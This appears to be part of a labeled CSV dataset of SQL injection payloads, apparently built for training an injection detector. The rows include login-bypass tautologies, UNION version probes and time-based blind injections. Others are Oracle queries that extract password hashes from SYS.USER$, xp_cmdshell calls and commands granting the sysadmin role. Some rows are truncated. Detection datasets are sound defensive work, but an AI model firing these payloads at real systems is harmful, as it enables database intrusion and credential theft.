,Sentence,Label
419," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1
421,or sleep  (  __TIME__  )  #,1
422," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
423," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1
424,||6,1
425,or 1/*,1
426," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
427,select * from users where id  =  1.%@ or 1  =  1 -- 1,1
428," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
429," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1
430," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1
431," or 1  =  1 or """"  =  ",1
432," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
433,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1
434," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
435,or 'whatever' in   (  'whatever'  ) ,1
436,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
437,select * from users where id  =  '1'   or 1  =  1 -- 1',1
438,?,1
439, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1
440," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1
441,"admin""  )   or   (  ""1""  =  ""1""#",1
442," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1
443," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1
444, or '' ',1
445," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1
446,or 1  =  1,1
448," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
449,""" or benchmark  (  10000000,MD5  (  1   )    )   #",1
450,""" or ""x""  =  ""x",1
451,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1
452," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1
453, or 'something' like 'some%',1
455," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
456,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1
458,admin' or '1'  =  '1'--,1
460," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
461," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1
462," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1
463,""";waitfor delay '0:0:__TIME__'--",1
465,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1
466," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1
467," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1
468,’ or ‘1’  =  ’1,1
469," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1
470,admin'or 1  =  1 or ''  =  ',1
471," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1
472," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
473,exec  (  @s  ) ,1
474," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1
475," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1
476, or 1  =  1,1
477,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1
478," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1
480," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1
481, --,1
482," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1
483," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
484," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1
485,update,1
486, or 1/*,1
487," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1
488,"""   )    )    or pg_sleep  (  __TIME__  )  --",1
489,||'6,1
490," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
491,or   (  EXISTS  ) ,1
492,^',1
493,or 'text'   =   n'text',1
494," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1
495," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1
496," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1
497," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1
498, or 0  =  0 --,1
499," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1
500," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1
501," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1
502," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1
503,password:*/  =  1--,1
504," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1
505," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1
506," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1
507," union   (  select NULL,   (  select @@version   )    )    --",1
508," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1
509," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1
510," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1
511," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1
512," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1
513," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1
514," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1
515," select * from users where id  =  1. union select null,version  (    )   -- 1",1
516," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1
517," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1
518, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1
519,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1
520," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
521," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1
522," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1
523," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1
524," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1
525,UNION SELECT,1
526,asc,1
527," || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1
528,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
529," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1
530,  )   or true--,1
531," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
532," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
533, or userid like '%,1
534," union   (  select NULL, NULL,   (  select @@version   )    )    --",1
535,/,1
536,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1
537,"admin""/*",1
538," select * from users where id  =  1.  union select 1,version  (    )   -- 1",1
540," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
541," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1
542,"admin"" or ""1""  =  ""1",1
543, union   (  select @@version  )   --,1
544, or ''^',1
545,"""   )    )    or sleep  (  __TIME__  )    =  """,1
546," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1
547," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1
548," select * from users where id  =  1 union select @ _,version  (    )   -- 1",1
549,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1
550,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1
551," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1
552," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1
553,"""hi""""  )   or   (  """"a""""  =  """"a""",1
554,select name from syscolumns where id   =     (  sele ...,1
555," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1
556,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1
557," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1
558, or 2 between 1 and 3,1
559,union all select @@version--,1
560," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
561,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
562,""" or isNULL  (  1/0  )   /*",1
563," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1
564," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1
565," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1
566,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1
567, or 'a'  =  'a,1
568, union all select @@version--,1
569," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1
570,"admin"" or 1  =  1/*",1
571, or   (  EXISTS  ) ,1
572," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1
573,declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1
574," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1
575," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1
576," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1
577," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1
579," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1
580,hi' or 1  =  1 --,1
581, UNION SELECT,1
582,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1
583," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1
584," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1
585," select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1
586,desc,1
587," select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1
588,anything' or 'x'  =  'x,1
589," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1
590,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1
591,0x770061006900740066006F0072002000640065006C00 ...,1
592," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1
593," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",1
594," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1
595," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",1
596,or isNULL  (  1/0  )   /*,1
597,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1
598," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1
599," select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1
600,"admin"" or ""1""  =  ""1""#",1
601,"admin"" or 1  =  1--",1
602, or user like '%,1
603,admin'  )   or '1'  =  '1,1
604,""" or sleep  (  __TIME__  )  #",1
605," select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",1
606," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1
607,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1
608, or ''-',1
609," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",1
610,admin'  )   or '1'  =  '1'/*,1
611," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
612," select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1
613,select * from users where id  =  1 <@$ or 1  =  1 -- 1,1
614,x' or 1  =  1 or 'x'  =  'y,1
615," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
616," select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1
617,  )   or   (  'x'  )    =    (  'x,1
618, ( ,1
619," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",1
620," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1
621," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",1
622," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1
623," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",1
624," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1
625," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1
626, )    )    or sleep  (  __TIME__  )    =  ',1
627,having 1  =  1--,1
628,!,1
629,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1
630, group by userid having 1  =  1--,1
631," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",1
632," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1
633,or 0  =  0 --,1
634, or 0  =  0 #,1
635,or pg_sleep  (  __TIME__  )  --,1
636,or '1'  =  '1'--,1
637," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1
638," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1
639," select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1
640, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,1
641,sqlvuln,1
642," select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",1
643," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1
644,0x730065006c0065006300740020004000400076006500 ...,1
645," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1
646," select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1
647,declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1
648,select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1
649, or ''&',1
650," select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",1
651," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
652," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",1
654," select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1
655,or 'something'   =   'some'+'thing',1
656,#NAME?,1
657,or 1 in   (  select @@version  )  --,1
658,declare @q nvarchar   (  4000  )   select @q   = ,1
659," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",1
